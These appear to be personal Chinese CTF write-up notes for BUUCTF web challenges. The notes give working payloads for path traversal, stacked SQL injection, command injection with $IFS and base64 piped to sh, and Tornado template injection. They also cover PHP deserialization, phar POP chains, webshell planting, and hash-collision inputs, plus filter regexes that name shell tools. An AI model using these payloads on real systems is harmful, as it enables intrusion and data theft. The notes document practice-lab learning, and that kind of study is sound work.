# BUUCTF



## [HCTF 2018] WarmUp 

### 目录穿越





```php
<?php
    highlight_file(__FILE__); //打印代码
class emmm  //定义emmm类
{
    public static function checkFile(&$page)//将传入的参数赋给$page
    {
        $whitelist = ["source"=>"source.php","hint"=>"hint.php"];//声明$whitelist（白名单）数组
        if (! isset($page) || !is_string($page)) {//若$page变量不存在或非字符串
            echo "you can't see it";//打印"you can't see it"
            return false;//返回false
        }
 
        if (in_array($page, $whitelist)) {//若$page变量存在于$whitelist数组中
            return true;//返回true
        }
 
        $_page = mb_substr(//该代码表示截取$page中'?'前部分，若无则截取整个$page
            $page,
            0,
            mb_strpos($page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }
 
        $_page = urldecode($page);//url解码$page
        $_page = mb_substr(
            $_page,
            0,
            mb_strpos($_page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }
        echo "you can't see it";
        return false;
    }
}

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?> 
```

source.php?file=source.php?/../../../../ffffllllaaaagggg

## [强网杯 2019] 随便注

### 过滤select 堆叠注入 

```sql
/?inject=1 ' order by 2 --+  测出有两列
但是 想联合注入查询的时候 

return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);

不能使用常用的 select 和where

```

#### 预编译

##### 拼接

```sql
payload：-1';use supersqli;set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;#

1';Set @sql=concat('sel','ect * from `1919810931114514`;');Prepare stmt from @sql;execute stmt;--+-
```

#####  16进制编码

```sql

十六进制：select * from `1919810931114514`
1';Set @sql=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;Prepare stmt from @sql;execute stmt;--+-
```



## [SUCTF 2019] EasySQL

记住就行了 确实是不会



```sql
后台实际语句 sql="select".post[‘query’]."||flag from Flag";

query=*,1
```

## [GXYCTF2019] PING

```php
?ip=127.0.0.1||ls

回显两个文件 flag.php和index.php

这题首先把空格ban了 
$IFS$9或者${IFS}  代替空格

然后cat$IFS$9index.php

<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}

?>

    
    ban了 好多东西
    
```

### base64

```
?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash
结果回显 
fuck  your bash
可以用sh代替bash
?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh

Y2F0IGZsYWcucGhw：cat flag.php
```

### 变量覆盖

因为后边有个a变量

```
?ip=127.0.0.1;a=g;tac$IFS$9fla$a.php
```

尽量还是用tac不用cat  因为cat还需要查看源码



## [HCTF 2018] admin

### 非预期

直接弱口令爆破了

账号admin

密码123

登录拿到flag- -

### 预期

#### flask的session伪造 （挖坑）

#### unicode欺骗

```
https://unicode-table.com/en/1D00/
利用这篇文章
思路:  
ᴬ -> A -> a

首先注册一个ᴬdmin
修改密码退出后再重新登录即可得到flag

具体原因在源码中有体现（挖坑）
```

参考文章：https://blog.csdn.net/weixin_44677409/article/details/100733581

## [BJDCTF2020] Easy MD5

一个输入框  尝试xss和ssti都不对

抓包看到header中有hint

```sql
select * from 'admin' where password=md5($pass,true)
```

直接百度

看到了这个链接 

https://blog.csdn.net/March97/article/details/81222922

对于

md5(string,raw)

```php
content: ffifdyop
hex: 276f722736c95d99e921722cf9ed621c
raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
string: 'or'6]!r,b

content: 129581926211651571912466741651878684928
hex: 06da5430449f8f6f23dfc1276f722738
raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1'or'8
string: T0Do#'or'8
```



直接输入ffifdyop或者下面的字符串

变成这样

```sql
select * from `admin` where password=''or'balabala'

当'or'后面的值为True时，即可构成万能密码实现SQL注入

然后题目里给的刚好后面是true
select * from 'admin' where password=md5($pass,true)
```

后面就是md5数组绕过了

烨师傅的题解也是讲的很清楚

包含了查找ffifdyop的脚本

https://www.cnblogs.com/yesec/p/12535534.html



好像是外国2010年的一道ctf

http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/



## [SUCTF 2019]CheckIn

题目总体不是很难 nginx上传.user.ini 就是要注意两点

一个是 ban了 <? 利用<script ;anguage='php'></script>绕过

一个是检测了文件内容用GIF89文件头绕过即可

这里自己犯了错误  上传完png后尝试用蚁剑链接  可是蚁剑没发链接png -- 

直接访问同目录下 index.php然后post执行命令即可



## [极客大挑战 2019]RCE ME

```php
<?php
error_reporting(0);
if(isset($_GET['code'])){
            $code=$_GET['code'];
                    if(strlen($code)>40){
                                        die("This is too Long.");
                                                }
                    if(preg_match("/[A-Za-z0-9]+/",$code)){
                                        die("NO.");
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}

// ?>
```

看到正则就知道 无字母数字rce

首先尝试下phpinfo()

![image-20220219225610235](C:\Users\19120\AppData\Roaming\Typora\typora-user-images\image-20220219225610235.png)

成功之后就写马了

![image-20220219225637610](C:\Users\19120\Desktop\2.png)

![image-20220219225705112](C:\Users\19120\Desktop\3.png)

蚁剑成功链接

但是不管是flag还是readflag都打不开

这里搜了下

直接利用蚁剑的插件  执行命令 /readflag即可

这里重点要说的是怎么使用插件

首先肯定是要科学上网

但是只是单纯科学上网也一直loading - - 

所以要设置代理

![image-20220219225856276](C:\Users\19120\Desktop\4.png)

然后在插件市场安装即可  

![image-20220219230023043](C:\Users\19120\Desktop\5.png)

最后执行命令即可拿到flag

# 3.10



### [RoarCTF 2019]Easy Calc

简单的无参rce

打开链接一个输入计算式的表达式  

直接查看源码

发现了一个文件 calc.php

```php
</div>
<!--I've set up WAF to ensure security.-->
<script>
    $('#calc').submit(function(){
        $.ajax({
            url:"calc.php?num="+encodeURIComponent($("#content").val()),
            type:'GET',
            success:function(data){
                $("#result").html(`<div class="alert alert-success">
            <strong>答案:</strong>${data}
            </div>`);
            },
            error:function(){
                alert("这啥?算不来!");
            }
        })
        return false;
    })
```

打开后看到

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```

先尝试下phpinfo()

返回403说明被waf拦截

这里用到了

#### php字符串解析特性

https://www.freebuf.com/articles/web/213359.html

通过空格绕过

?%20num=phpinfo()

然后查看disable_functions

发现 scandir没有被ban

直接查看一下

```php
?%20num=print_r(scandir(current(localeconv())))
返回 Array
print_r(array_reverse(scandir(current(localeconv()))))

Array ( [0] => libs [1] => index.html [2] => calc.php [3] => .. [4] => . ) 1
然后查看上级目录
因为双引号被ban了  无法使用 scandir(".")
但是可以使用chr
直接

Array ( [0] => var [1] => usr [2] => tmp [3] => sys [4] => start.sh [5] => srv [6] => sbin [7] => run [8] => root [9] => proc [10] => opt [11] => mnt [12] => media [13] => lib64 [14] => lib [15] => home [16] => f1agg [17] => etc [18] => dev [19] => boot [20] => bin [21] => .dockerenv [22] => .. [23] => . ) 1
可以看到有f1agg
直接访问就可
?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
?%20num=readfile(chr(47).chr(102).chr(49).chr(97).chr(103).c hr(103))

都可


```

## [护网杯 2018]easy_tornado

模板注入 

打开三个文件  逐一点开

```php
/flag.txt
flag in /fllllllllllllag

/welcome.txt
render   //查阅说是模板注入

/hints.txt
md5(cookie_secret+md5(filename))


render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用

Tornado是一种 Web 服务器软件的开源版本。Tornado 和现在的主流 Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。
在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量


```

看了下 懂了大概思路

```
http://0ce5ce51-72ca-4e40-97b6-c753901a3788.node4.buuoj.cn:81/file?filename=/hints.txt&filehash=15d161436bc875f26a17b55cc2c8edc7
```

首先可以知道flag  在/fllllllllllllag  是要把filename改为这个

然后filehash就是md5(cookie_secret+md5(filename))

所以这里要获得 cookie_secret

就用到了模板注入 

https://www.cnblogs.com/cimuhuashuimu/p/11544455.html

搜索 tornado模板注入  刚好搜到

```
error?msg={{handler.settings}}  即可获得cookie_secret

```

然后再写个脚本  进行md5

```python
import hashlib
hash = hashlib.md5()

filename='/fllllllllllllag'
cookie_secret = "b3dfb87a-0832-41ef-8939-28d87cf3cdb6"
hash.update(filename.encode('utf-8'))
s1=hash.hexdigest()
hash = hashlib.md5()
hash.update((cookie_secret+s1).encode('utf-8'))
print(hash.hexdigest())


```

最后得到flag

```
http://0ce5ce51-72ca-4e40-97b6-c753901a3788.node4.buuoj.cn:81/file?filename=/fllllllllllllag&filehash=dcee064e98f21bea6fee9caecf228db6
```

## [ZJCTF 2019]NiZhuanSiWei



```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

首先  text要传入一个文件 内容是 welcome........

可以利用data协议或者input

但是尝试了下input不行 不知道为啥

第二步明显要读取一下useless.php

filter协议

读取出来为以下代码

```php
PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=

<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

非常简单的反序列化

```php
<?php  

class Flag{  //flag.php  
    public $file="flag.php";  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
$password=new Flag();
echo serialize($password);
?>  
```



```php
?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}  
这样并不能获得flag
因为 file是读取 内容 base64输出
应改为直接访问、
?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}  
```

# 3.12

### [网鼎杯 2020 青龙组]AreUSerialz

贼简单的反序列化  

```php
ptotected   %00*%00类名
private     %00类名%00
```

### [网鼎杯 2020 朱雀组]phpweb

这个题有意思

hackbar  load一下

看到post传两个参数

```php
func=date&p=Y-m-d+h%3Ai%3As+a
```

不看wp确实不知道啥意思 

看了之后才知道 

data是一个函数  后面就是函数的参数

然后可以用file_get_contents 直接读取index.php

读出源码 

```php
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>

```



因为 知道是函数类型了

可以利用反序列化函数进行命令执行

然后一层层查看flag即可

```php
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:21:"tac ../../../tmp/fla*";s:4:"func";s:6:"system";}
```

## 3.13



### [安洵杯 2019]easy_serialize_php

反序列化字符串逃逸

首先进去 看到源码

```php
 <?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
} 
```

注意到最后有个phpinfo可以利用

查看后发现

给了个d0g3_f1ag.php 猜测可能是flag（后来发现其实不是）

然后通读源码发现是字符串逃逸

最后有个file_get_contents可以利用

所以肯定是让img=d0g3_f1ag.php的b64

**这里一个需要注意的地方就是变量SESSION的问题**

这个变量有三个参数  构造的时候三个参数都要构造

```php
<?php
$_SESSION["user"] = 'flagflagflagflagflagflag';
$_SESSION["function"] = '2";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:5:"ddddd";s:1:"a";}';
$_SESSION["img"] = "ZDBnM19mMWFnLnBocA==";

 echo serialize($_SESSION);

-> 
    a:3:{s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:62:"2";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:5:"ddddd";s:1:"a";}";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

注意6个flag替换24个字符  替换的字符为

";s:8:"function";s:62:"2

这样刚好flag前的"  与之后的";构成闭合

然后传参

```php
get：
f=show_image

post：
_SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=2";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:5:"ddddd";s:1:"a";}
```

完事又给了真正的flag文件  b64刚好也是20直接换就可以了

## 

### [SWPUCTF 2018]SimplePHP

phar反序列化

在查看文件页面有个文件读取

一步步查看几个文件源码

```php
<?php
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }

    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->get($key);
    }
    public function get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
?>
```

没有 unserialize  但是过滤了好多协议 留出了phar

明显phar反序列化 还要注意某个文件中限制了后缀 最后phar文件改为jpg即可

看pop链

肯定是要利用最后的file_get_contents

然后看到$value 往上看的话  $value=params[$key]

在往上看  _get 魔法函数 触发 get函数

_get()：调用私有属性或未定义的是属性（未定义的变量）时使用

这里往上看到 Show类中的  _tosting魔法函数

只需要将str['str']=Test类   即可达到了调用不存在的变量的目的 

_toString()： //当一个对象被当作字符串使用时触发

在往上看到第一个类中的_destruct

echo 了一个对象  即可调用_tostring

所以pop链为

```php
C1e4r::_destruct() --> Show::_toString() --> Test::__get() 
```



```php
<?php
class C1e4r
{
    public $test;
    public $str;
}
class Show
{
    public $source;
    public $str;
}
class Test
{
    public $file;
    public $params;
}

$a = new C1e4r();
$b = new Show();
$c= new Test();

$a -> str = $b;
$b -> str['str'] = $c;
$c->params=array('source'=>'var/www/html/f1ag.php');
echo serialize($a);//可有可无

$phar = new Phar("exp.phar"); //.phar文件
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ? >'); //固定的
$phar->setMetadata($a); //触发的头是C1e4r类，所以传入C1e4r对象
$phar->addFromString("test.txt", "test");//生成签名 可有可无
$phar->stopBuffering();
?>
```

因为限制了后缀  生成exp.phar改后缀为jpg即可

上传后  直接不会了 因为没给上传后的路径

然后原来是可以直接在url上输/upload/

有了路径后再在开始的文件包含里

?file=phar://upload/xxxx.jpg

得到flag



## 3.14

### [安洵杯 2019]easy_web

#### md5强类型碰撞

```
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

#### sha1强类型碰撞

```
user=%25%50%44%46%2D%31%2E%33%0A%25%E2%E3%CF%D3%0A%0A%0A%31%20%30%20%6F%62%6A%0A%3C%3C%2F%57%69%64%74%68%20%32%20%30%20%52%2F%48%65%69%67%68%74%20%33%20%30%20%52%2F%54%79%70%65%20%34%20%30%20%52%2F%53%75%62%74%79%70%65%20%35%20%30%20%52%2F%46%69%6C%74%65%72%20%36%20%30%20%52%2F%43%6F%6C%6F%72%53%70%61%63%65%20%37%20%30%20%52%2F%4C%65%6E%67%74%68%20%38%20%30%20%52%2F%42%69%74%73%50%65%72%43%6F%6D%70%6F%6E%65%6E%74%20%38%3E%3E%0A%73%74%72%65%61%6D%0A%FF%D8%FF%FE%00%24%53%48%41%2D%31%20%69%73%20%64%65%61%64%21%21%21%21%21%85%2F%EC%09%23%39%75%9C%39%B1%A1%C6%3C%4C%97%E1%FF%FE%01%7F%46%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2%56%0B%45%CA%67%D6%88%C7%F8%4B%8C%4C%79%1F%E0%2B%3D%F6%14%F8%6D%B1%69%09%01%C5%6B%45%C1%53%0A%FE%DF%B7%60%38%E9%72%72%2F%E7%AD%72%8F%0E%49%04%E0%46%C2%30%57%0F%E9%D4%13%98%AB%E1%2E%F5%BC%94%2B%E3%35%42%A4%80%2D%98%B5%D7%0F%2A%33%2E%C3%7F%AC%35%14%E7%4D%DC%0F%2C%C1%A8%74%CD%0C%78%30%5A%21%56%64%61%30%97%89%60%6B%D0%BF%3F%98%CD%A8%04%46%29%A1%3C%68%74%6D%6C%3E%0A%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%6A%61%76%61%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%3E%0A%3C%21%2D%2D%20%40%61%72%77%20%2D%2D%3E%0A%0A%76%61%72%20%68%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%54%61%67%4E%61%6D%65%28%22%48%54%4D%4C%22%29%5B%30%5D%2E%69%6E%6E%65%72%48%54%4D%4C%2E%63%68%61%72%43%6F%64%65%41%74%28%31%30%32%29%2E%74%6F%53%74%72%69%6E%67%28%31%36%29%3B%0A%69%66%20%28%68%20%3D%3D%20%27%37%33%27%29%20%7B%0A%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%2E%69%6E%6E%65%72%48%54%4D%4C%20%3D%20%22%3C%53%54%59%4C%45%3E%62%6F%64%79%7B%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%52%45%44%3B%7D%20%68%31%7B%66%6F%6E%74%2D%73%69%7A%65%3A%35%30%30%25%3B%7D%3C%2F%53%54%59%4C%45%3E%3C%48%31%3E%26%23%78%31%66%36%34%38%3B%3C%2F%48%31%3E%22%3B%0A%7D%20%65%6C%73%65%20%7B%0A%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%2E%69%6E%6E%65%72%48%54%4D%4C%20%3D%20%22%3C%53%54%59%4C%45%3E%62%6F%64%79%7B%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%42%4C%55%45%3B%7D%20%68%31%7B%66%6F%6E%74%2D%73%69%7A%65%3A%35%30%30%25%3B%7D%3C%2F%53%54%59%4C%45%3E%3C%48%31%3E%26%23%78%31%66%36%34%39%3B%3C%2F%48%31%3E%22%3B%0A%7D%0A%0A%3C%2F%73%63%72%69%70%74%3E%0A%0A&pass=%25%50%44%46%2D%31%2E%33%0A%25%E2%E3%CF%D3%0A%0A%0A%31%20%30%20%6F%62%6A%0A%3C%3C%2F%57%69%64%74%68%20%32%20%30%20%52%2F%48%65%69%67%68%74%20%33%20%30%20%52%2F%54%79%70%65%20%34%20%30%20%52%2F%53%75%62%74%79%70%65%20%35%20%30%20%52%2F%46%69%6C%74%65%72%20%36%20%30%20%52%2F%43%6F%6C%6F%72%53%70%61%63%65%20%37%20%30%20%52%2F%4C%65%6E%67%74%68%20%38%20%30%20%52%2F%42%69%74%73%50%65%72%43%6F%6D%70%6F%6E%65%6E%74%20%38%3E%3E%0A%73%74%72%65%61%6D%0A%FF%D8%FF%FE%00%24%53%48%41%2D%31%20%69%73%20%64%65%61%64%21%21%21%21%21%85%2F%EC%09%23%39%75%9C%39%B1%A1%C6%3C%4C%97%E1%FF%FE%01%73%46%DC%91%66%B6%7E%11%8F%02%9A%B6%21%B2%56%0F%F9%CA%67%CC%A8%C7%F8%5B%A8%4C%79%03%0C%2B%3D%E2%18%F8%6D%B3%A9%09%01%D5%DF%45%C1%4F%26%FE%DF%B3%DC%38%E9%6A%C2%2F%E7%BD%72%8F%0E%45%BC%E0%46%D2%3C%57%0F%EB%14%13%98%BB%55%2E%F5%A0%A8%2B%E3%31%FE%A4%80%37%B8%B5%D7%1F%0E%33%2E%DF%93%AC%35%00%EB%4D%DC%0D%EC%C1%A8%64%79%0C%78%2C%76%21%56%60%DD%30%97%91%D0%6B%D0%AF%3F%98%CD%A4%BC%46%29%B1%3C%68%74%6D%6C%3E%0A%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%6A%61%76%61%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%3E%0A%3C%21%2D%2D%20%40%61%72%77%20%2D%2D%3E%0A%0A%76%61%72%20%68%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%54%61%67%4E%61%6D%65%28%22%48%54%4D%4C%22%29%5B%30%5D%2E%69%6E%6E%65%72%48%54%4D%4C%2E%63%68%61%72%43%6F%64%65%41%74%28%31%30%32%29%2E%74%6F%53%74%72%69%6E%67%28%31%36%29%3B%0A%69%66%20%28%68%20%3D%3D%20%27%37%33%27%29%20%7B%0A%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%2E%69%6E%6E%65%72%48%54%4D%4C%20%3D%20%22%3C%53%54%59%4C%45%3E%62%6F%64%79%7B%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%52%45%44%3B%7D%20%68%31%7B%66%6F%6E%74%2D%73%69%7A%65%3A%35%30%30%25%3B%7D%3C%2F%53%54%59%4C%45%3E%3C%48%31%3E%26%23%78%31%66%36%34%38%3B%3C%2F%48%31%3E%22%3B%0A%7D%20%65%6C%73%65%20%7B%0A%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%2E%69%6E%6E%65%72%48%54%4D%4C%20%3D%20%22%3C%53%54%59%4C%45%3E%62%6F%64%79%7B%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%42%4C%55%45%3B%7D%20%68%31%7B%66%6F%6E%74%2D%73%69%7A%65%3A%35%30%30%25%3B%7D%3C%2F%53%54%59%4C%45%3E%3C%48%31%3E%26%23%78%31%66%36%34%39%3B%3C%2F%48%31%3E%22%3B%0A%7D%0A%0A%3C%2F%73%63%72%69%70%74%3E%0A%0A
```

```php
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    
    ban了很多东西
        但是放开了 \/ 
        ls可以l\s
        所以相当于没ban
        
```

### [SUCTF 2018]GetShell

```php
<?php

if($contents=file_get_contents($_FILES["file"]["tmp_name"])){
    $data=substr($contents,5);
    foreach ($black_char as $b) {
        if (stripos($data, $b) !== false){
            die("illegal char");
        }
    }     
}		
```

检查文章的内容 （除了前五位）

大佬的fuzz脚本

```python

import requests

def ascii_str():
	str_list=[]
	for i in range(33,127):
		str_list.append(chr(i))
	#print('可显示字符：%s'%str_list)
	return str_list

def upload_post(url):
	str_list = ascii_str()
	for str in str_list:
		header = {
		'Host':'3834350a-887f-4ac1-baa4-954ab830c879.node3.buuoj.cn',
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
		'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
		'Accept-Encoding':'gzip, deflate',
		'Content-Type':'multipart/form-data; boundary=---------------------------339469688437537919752303518127'
		}
		post = '''-----------------------------339469688437537919752303518127
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

12345'''+str+'''
-----------------------------339469688437537919752303518127
Content-Disposition: form-data; name="submit"

提交			
-----------------------------339469688437537919752303518127--'''

		res = requests.post(url,data=post.encode('UTF-8'),headers=header)
		if 'Stored' in res.text:
			print("该字符可以通过:  {0}".format(str))
		else:
			print("过滤字符:  {0}".format(str))
			


if __name__ == '__main__':
	url = 'http://3834350a-887f-4ac1-baa4-954ab830c879.node3.buuoj.cn/index.php?act=upload'
	upload_post(url)
    
    
    
    
    过滤字符:  !
过滤字符:  "
过滤字符:  #
该字符可以通过:  $
过滤字符:  %
过滤字符:  &
过滤字符:  '
该字符可以通过:  (
该字符可以通过:  )
过滤字符:  *
过滤字符:  +
过滤字符:  ,
过滤字符:  -
该字符可以通过:  .
过滤字符:  /
过滤字符:  0
过滤字符:  1
过滤字符:  2
过滤字符:  3
过滤字符:  4
过滤字符:  5
过滤字符:  6
过滤字符:  7
过滤字符:  8
过滤字符:  9
过滤字符:  :
该字符可以通过:  ;
过滤字符:  <
该字符可以通过:  =
过滤字符:  >
过滤字符:  ?
过滤字符:  @
过滤字符:  A
过滤字符:  B
过滤字符:  C
过滤字符:  D
过滤字符:  E
过滤字符:  F
过滤字符:  G
过滤字符:  H
过滤字符:  I
过滤字符:  J
过滤字符:  K
过滤字符:  L
过滤字符:  M
过滤字符:  N
过滤字符:  O
过滤字符:  P
过滤字符:  Q
过滤字符:  R
过滤字符:  S
过滤字符:  T
过滤字符:  U
